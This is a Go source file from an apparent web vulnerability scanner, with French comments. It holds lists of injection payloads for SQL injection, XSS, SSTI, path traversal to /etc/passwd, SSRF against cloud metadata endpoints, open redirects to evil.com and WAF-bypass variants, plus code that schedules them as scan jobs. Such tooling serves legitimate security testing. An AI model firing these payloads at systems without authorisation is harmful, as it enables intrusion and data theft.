package payloads

import (
	"fmt"
	"strings"

	"github.com/sqli-hunter/sqli-hunter/internal/models"
)

// SQLErrorPatterns associe un DBMS à des motifs d'erreur SQL.
var SQLErrorPatterns = map[string][]string{
	"mysql": {
		`SQL syntax.*MySQL`,
		`Warning.*mysql_`,
		`MySQLSyntaxErrorException`,
		`valid MySQL result`,
		`check the manual that corresponds to your (MySQL|MariaDB)`,
		`Unknown column`,
		`You have an error in your SQL syntax`,
		`mysql_fetch`,
		`mysqli_`,
	},
	"postgresql": {
		`PostgreSQL.*ERROR`,
		`Warning.*\Wpg_`,
		`valid PostgreSQL result`,
		`Npgsql\.`,
		`PG::SyntaxError:`,
		`org\.postgresql\.util\.PSQLException`,
		`ERROR:\s+syntax error at or near`,
		`unterminated quoted string`,
	},
	"mssql": {
		`Driver.* SQL[\-\_\ ]*Server`,
		`OLE DB.* SQL Server`,
		`(\W|\A)SQL Server.*Driver`,
		`Warning.*mssql_`,
		`(\W|\A)SQL Server.*[Ee]xception`,
		`System\.Data\.SqlClient\.`,
		`Unclosed quotation mark`,
		`Microsoft SQL Native Client error`,
		`\[SQL Server\]`,
		`ODBC SQL Server Driver`,
		`SQLServer JDBC Driver`,
		`com\.microsoft\.sqlserver\.jdbc`,
	},
	"oracle": {
		`\bORA-\d{5}`,
		`Oracle error`,
		`Oracle.*Driver`,
		`Warning.*\Woci_`,
		`Warning.*\Wora_`,
		`quoted string not properly terminated`,
	},
	"sqlite": {
		`SQLite/JDBCDriver`,
		`SQLite\.Exception`,
		`System\.Data\.SQLite\.SQLiteException`,
		`Warning.*sqlite_`,
		`Warning.*SQLite3::`,
		`\[SQLITE_ERROR\]`,
		`SQLITE_CONSTRAINT`,
		`unrecognized token`,
		`near ".*": syntax error`,
	},
	"generic": {
		`SQL syntax`,
		`syntax error`,
		`unexpected end of SQL command`,
		`quoted string not properly terminated`,
		`unclosed quotation mark`,
		`SQL command not properly ended`,
	},
}

// Payloads rapides — les plus efficaces en bug bounty
var (
	fastErrorPayloads = []string{
		"'",
		`' OR '1'='1'--`,
		`1' OR '1'='1--`,
		`') OR ('1'='1`,
		`1 OR 1=1`,
		`admin'--`,
		`' UNION SELECT NULL--`,
		`" OR "1"="1`,
	}

	fastUnionPayloads = []string{
		`' UNION SELECT NULL--`,
		`' UNION SELECT NULL,NULL--`,
		`' UNION SELECT 1,@@version,3--`,
		`') UNION SELECT NULL--`,
	}

	fastBooleanTrue = []string{`' OR '1'='1`, `' OR 1=1--`}
	fastBooleanFalse = []string{`' AND '1'='2`, `' AND 1=2--`}

	fastTimeTemplates = []string{
		`' AND SLEEP(%d)--`,
		`'; SELECT pg_sleep(%d)--`,
	}

	fastXSSPayloads = []string{
		`<script>alert(1)</script>`,
		`"><script>alert(1)</script>`,
		`'><svg/onload=alert(1)>`,
		`<img src=x onerror=alert(1)>`,
		`'"><img src=x onerror=alert(1)>`,
		`javascript:alert(1)`,
	}

	fastRedirectPayloads = []string{
		`https://evil.com`,
		`//evil.com`,
		`/\evil.com`,
		`////evil.com`,
		`https:evil.com`,
	}

	fastLFIPayloads = []string{
		`../../../etc/passwd`,
		`....//....//etc/passwd`,
		`..%2f..%2f..%2fetc/passwd`,
		`/etc/passwd`,
		`..\\..\\..\\windows\\win.ini`,
		`....\/....\/etc/passwd`,
	}

	fastSSRFPayloads = []string{
		`http://127.0.0.1`,
		`http://localhost`,
		`http://169.254.169.254/latest/meta-data/`,
		`http://[::1]`,
	}

	fastSSTIPayloads = []string{
		`{{7*7}}`,
		`${7*7}`,
		`#{7*7}`,
		`{{7*'7'}}`,
		`*{7*7}`,
	}

	idorProbeParams = []string{"id", "user_id", "userid", "uid", "account_id", "order_id", "doc_id", "file_id"}
)

// Payloads complets
var (
	fullErrorPayloads = []string{
		"'", `"`,
		`' OR '1'='1`, `' OR '1'='1'--`, `' OR '1'='1'#`, `' OR '1'='1'/*`,
		`') OR ('1'='1`, `1' OR '1'='1`, `1 OR 1=1`, `1' OR '1'='1'-- -`,
		`admin'--`, `admin' #`,
		`' UNION SELECT NULL--`, `' UNION SELECT NULL,NULL--`,
		`1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--`,
		`1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--`,
		`' AND 1=CONVERT(int,(SELECT @@version))--`,
		`'||(SELECT version())||'`,
	}

	fullUnionPayloads = []string{
		`' UNION SELECT NULL--`, `' UNION SELECT NULL,NULL--`,
		`' UNION SELECT NULL,NULL,NULL--`, `' UNION SELECT NULL,NULL,NULL,NULL--`,
		`' UNION ALL SELECT NULL--`, `' UNION ALL SELECT NULL,NULL--`,
		`') UNION SELECT NULL--`, `' UNION SELECT 1,2,3--`,
		`' UNION SELECT 1,@@version,3--`, `' UNION SELECT 1,version(),3--`,
		`0 UNION SELECT NULL,NULL,NULL--`, `-1 UNION SELECT NULL,NULL,NULL--`,
	}

	fullBooleanTrue = []string{
		`' OR '1'='1`, `' OR 1=1--`, `' OR 1=1#`, `1 OR 1=1`,
		`1' OR '1'='1'--`, `') OR ('1'='1'--`, `1) OR (1=1`, `' OR ''='`,
	}
	fullBooleanFalse = []string{
		`' AND '1'='2`, `' AND 1=2--`, `' AND 1=2#`, `1 AND 1=2`,
		`1' AND '1'='2'--`, `') AND ('1'='2'--`, `1) AND (1=2`, `' AND ''='`,
	}

	fullTimeTemplates = []string{
		`' AND SLEEP(%d)--`, `' AND SLEEP(%d)#`,
		`1' AND SLEEP(%d)--`, `1) AND SLEEP(%d)--`,
		`'; WAITFOR DELAY '0:0:%d'--`, `'; SELECT pg_sleep(%d)--`,
		`1'; SELECT pg_sleep(%d)--`,
		`' AND (SELECT * FROM (SELECT(SLEEP(%d)))a)--`,
		`' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',%d)--`,
	}

	fullXSSPayloads = []string{
		`<script>alert(1)</script>`, `"><script>alert(1)</script>`,
		`'><svg/onload=alert(1)>`, `<img src=x onerror=alert(1)>`,
		`'"><img src=x onerror=alert(1)>`, `javascript:alert(1)`,
		`<body onload=alert(1)>`, `<iframe src=javascript:alert(1)>`,
		`"><img src=x onerror=alert(1)>`, `<svg><script>alert(1)</script>`,
		`{{constructor.constructor('alert(1)')()}}`,
	}

	fullRedirectPayloads = []string{
		`https://evil.com`, `//evil.com`, `/\evil.com`, `////evil.com`,
		`https:evil.com`, `//google.com`, `/%09/evil.com`,
		`https://evil.com%00.target.com`, `///evil.com`,
	}

	fullLFIPayloads = []string{
		`../../../etc/passwd`, `....//....//etc/passwd`,
		`..%2f..%2f..%2fetc/passwd`, `/etc/passwd`,
		`..\\..\\..\\windows\\win.ini`, `....\/....\/etc/passwd`,
		`file:///etc/passwd`, `php://filter/convert.base64-encode/resource=index.php`,
		`/proc/self/environ`, `....//....//....//etc/passwd`,
	}

	fullSSRFPayloads = []string{
		`http://127.0.0.1`, `http://localhost`, `http://127.0.0.1:80`,
		`http://169.254.169.254/latest/meta-data/`, `http://[::1]`,
		`http://0.0.0.0`, `http://metadata.google.internal/`,
		`http://127.1`, `dict://127.0.0.1:6379/info`,
	}

	fullSSTIPayloads = []string{
		`{{7*7}}`, `${7*7}`, `#{7*7}`, `{{7*'7'}}`, `*{7*7}`,
		`<%= 7*7 %>`, `{{config}}`, `{{self}}`, `{{''.__class__}}`,
		`{7*7}`, `[[7*7]]`,
	}

	wafBypassPayloads = []string{
		`' oR '1'='1`, `'%20OR%20'1'='1`, `'/**/OR/**/'1'='1`,
		`'%09OR%091=1--`, `' UnIoN SeLeCt NULL--`,
		`' /*!50000OR*/ '1'='1`, `1'||'1'='1`, `' OR 2>1--`,
	}
)

// BooleanPair associe un payload vrai et faux.
type BooleanPair struct {
	True  string
	False string
}

// BuildJobs génère la liste de tests ordonnés par priorité.
func BuildJobs(opts models.ScanOptions) []models.TestJob {
	categories := opts.Categories
	if len(categories) == 0 {
		categories = DefaultCategories(opts.Mode)
	}

	full := opts.Mode == models.ScanFull
	var jobs []models.TestJob

	for _, cat := range categories {
		switch cat {
		case models.CategorySQLi:
			jobs = append(jobs, buildSQLiJobs(opts, full)...)
		case models.CategoryXSS:
			jobs = append(jobs, buildSimpleJobs(models.XSS, cat, xssPayloads(full), 20)...)
		case models.CategorySSTI:
			jobs = append(jobs, buildSimpleJobs(models.SSTI, cat, sstiPayloads(full), 25)...)
		case models.CategoryRedirect:
			jobs = append(jobs, buildSimpleJobs(models.OpenRedirect, cat, redirectPayloads(full), 30)...)
		case models.CategoryLFI:
			jobs = append(jobs, buildSimpleJobs(models.LFI, cat, lfiPayloads(full), 40)...)
		case models.CategorySSRF:
			jobs = append(jobs, buildSimpleJobs(models.SSRF, cat, ssrfPayloads(full), 50)...)
		case models.CategoryIDOR:
			// IDOR : pas de payload, testé séparément dans le scanner
		}
	}

	if opts.IncludeWAF {
		for i, j := range jobs {
			if j.VulnType == models.SQLiError {
				for _, w := range wafBypassPayloads {
					jobs = append(jobs, models.TestJob{
						Param: "", VulnType: models.SQLiError, Category: models.CategorySQLi,
						Payload: w, Priority: j.Priority,
					})
				}
				_ = i
				break
			}
		}
	}
	for _, c := range opts.CustomPayloads {
		jobs = append(jobs, models.TestJob{
			VulnType: models.SQLiError, Category: models.CategorySQLi,
			Payload: c, Priority: 1,
		})
	}

	return jobs
}

func buildSQLiJobs(opts models.ScanOptions, full bool) []models.TestJob {
	techniques := opts.Techniques
	if len(techniques) == 0 {
		techniques = DefaultSQLiTechniques(opts.Mode)
	}

	allowed := make(map[models.VulnType]bool)
	for _, t := range techniques {
		allowed[t] = true
	}

	var jobs []models.TestJob

	if allowed[models.SQLiError] {
		jobs = append(jobs, buildSimpleJobs(models.SQLiError, models.CategorySQLi, errorPayloads(full), 1)...)
	}
	if allowed[models.SQLiUnion] {
		jobs = append(jobs, buildSimpleJobs(models.SQLiUnion, models.CategorySQLi, unionPayloads(full), 10)...)
	}
	if allowed[models.SQLiBoolean] {
		for i, pair := range booleanPairs(full) {
			jobs = append(jobs, models.TestJob{
				VulnType: models.SQLiBoolean, Category: models.CategorySQLi,
				Payload: pair.True, PayloadB: pair.False, Priority: 20 + i,
			})
		}
	}
	if allowed[models.SQLiTime] {
		for i, p := range formatTime(timeTemplates(full), opts.TimeDelaySec) {
			jobs = append(jobs, models.TestJob{
				VulnType: models.SQLiTime, Category: models.CategorySQLi,
				Payload: p, Priority: 60 + i,
			})
		}
	}

	return jobs
}

func buildSimpleJobs(vt models.VulnType, cat models.VulnCategory, payloads []string, basePriority int) []models.TestJob {
	jobs := make([]models.TestJob, 0, len(payloads))
	for i, p := range payloads {
		jobs = append(jobs, models.TestJob{
			VulnType: vt, Category: cat, Payload: p, Priority: basePriority + i,
		})
	}
	return jobs
}

func errorPayloads(full bool) []string {
	if full {
		return append([]string{}, fullErrorPayloads...)
	}
	return append([]string{}, fastErrorPayloads...)
}

func unionPayloads(full bool) []string {
	if full {
		return append([]string{}, fullUnionPayloads...)
	}
	return append([]string{}, fastUnionPayloads...)
}

func booleanPairs(full bool) []BooleanPair {
	t, f := fullBooleanTrue, fullBooleanFalse
	if !full {
		t, f = fastBooleanTrue, fastBooleanFalse
	}
	n := len(t)
	if len(f) < n {
		n = len(f)
	}
	pairs := make([]BooleanPair, 0, n)
	for i := 0; i < n; i++ {
		pairs = append(pairs, BooleanPair{True: t[i], False: f[i]})
	}
	return pairs
}

func timeTemplates(full bool) []string {
	if full {
		return append([]string{}, fullTimeTemplates...)
	}
	return append([]string{}, fastTimeTemplates...)
}

func xssPayloads(full bool) []string {
	if full {
		return append([]string{}, fullXSSPayloads...)
	}
	return append([]string{}, fastXSSPayloads...)
}

func redirectPayloads(full bool) []string {
	if full {
		return append([]string{}, fullRedirectPayloads...)
	}
	return append([]string{}, fastRedirectPayloads...)
}

func lfiPayloads(full bool) []string {
	if full {
		return append([]string{}, fullLFIPayloads...)
	}
	return append([]string{}, fastLFIPayloads...)
}

func ssrfPayloads(full bool) []string {
	if full {
		return append([]string{}, fullSSRFPayloads...)
	}
	return append([]string{}, fastSSRFPayloads...)
}

func sstiPayloads(full bool) []string {
	if full {
		return append([]string{}, fullSSTIPayloads...)
	}
	return append([]string{}, fastSSTIPayloads...)
}

// IDORProbeParams retourne les noms de paramètres à tester pour IDOR.
func IDORProbeParams() []string {
	return append([]string{}, idorProbeParams...)
}

func formatTime(templates []string, delay int) []string {
	if delay < 1 {
		delay = 3
	}
	out := make([]string, 0, len(templates))
	for _, tmpl := range templates {
		out = append(out, fmt.Sprintf(tmpl, delay))
	}
	return out
}

// DefaultCategories retourne les catégories par défaut selon le mode.
func DefaultCategories(mode models.ScanMode) []models.VulnCategory {
	return []models.VulnCategory{
		models.CategorySQLi,
		models.CategoryXSS,
		models.CategorySSTI,
		models.CategoryRedirect,
		models.CategoryLFI,
		models.CategorySSRF,
		models.CategoryIDOR,
	}
}

// DefaultSQLiTechniques retourne les techniques SQLi par défaut.
func DefaultSQLiTechniques(mode models.ScanMode) []models.VulnType {
	if mode == models.ScanFull {
		return []models.VulnType{models.SQLiError, models.SQLiUnion, models.SQLiBoolean, models.SQLiTime}
	}
	// Mode rapide : pas de time-based (trop lent)
	return []models.VulnType{models.SQLiError, models.SQLiUnion, models.SQLiBoolean}
}

// AllTechniques retourne toutes les techniques SQLi.
func AllTechniques() []models.VulnType {
	return []models.VulnType{models.SQLiError, models.SQLiBoolean, models.SQLiTime, models.SQLiUnion}
}

// ParseCategory parse une catégorie ou technique depuis la CLI.
func ParseCategory(s string) (models.VulnCategory, models.VulnType, error) {
	switch strings.ToLower(s) {
	case "sqli", "sql":
		return models.CategorySQLi, "", nil
	case "xss":
		return models.CategoryXSS, models.XSS, nil
	case "ssti", "template":
		return models.CategorySSTI, models.SSTI, nil
	case "idor", "bac", "access":
		return models.CategoryIDOR, models.IDOR, nil
	case "redirect", "open_redirect", "openredirect":
		return models.CategoryRedirect, models.OpenRedirect, nil
	case "lfi", "path_traversal", "traversal":
		return models.CategoryLFI, models.LFI, nil
	case "ssrf":
		return models.CategorySSRF, models.SSRF, nil
	case "error", "error_based", "e":
		return models.CategorySQLi, models.SQLiError, nil
	case "boolean", "boolean_blind", "b":
		return models.CategorySQLi, models.SQLiBoolean, nil
	case "time", "time_blind", "t":
		return models.CategorySQLi, models.SQLiTime, nil
	case "union", "union_based", "u":
		return models.CategorySQLi, models.SQLiUnion, nil
	default:
		return "", "", fmt.Errorf("catégorie inconnue : %s", s)
	}
}

// GetBooleanPairs retourne les paires boolean (rétrocompat tests).
func GetBooleanPairs(full bool) []BooleanPair {
	return booleanPairs(full)
}

// GetPayloads rétrocompat.
func GetPayloads(techniques []models.VulnType, includeWAF bool, custom []string) map[models.VulnType][]string {
	result := make(map[models.VulnType][]string)
	for _, t := range techniques {
		switch t {
		case models.SQLiError:
			p := errorPayloads(true)
			if includeWAF {
				p = append(p, wafBypassPayloads...)
			}
			p = append(p, custom...)
			result[t] = p
		case models.SQLiBoolean:
			var combined []string
			for _, pair := range booleanPairs(true) {
				combined = append(combined, pair.True, pair.False)
			}
			result[t] = combined
		case models.SQLiTime:
			result[t] = timeTemplates(true)
		case models.SQLiUnion:
			result[t] = unionPayloads(true)
		}
	}
	return result
}

// FormatTimePayloads rétrocompat.
func FormatTimePayloads(delaySec int) []string {
	return formatTime(timeTemplates(true), delaySec)
}
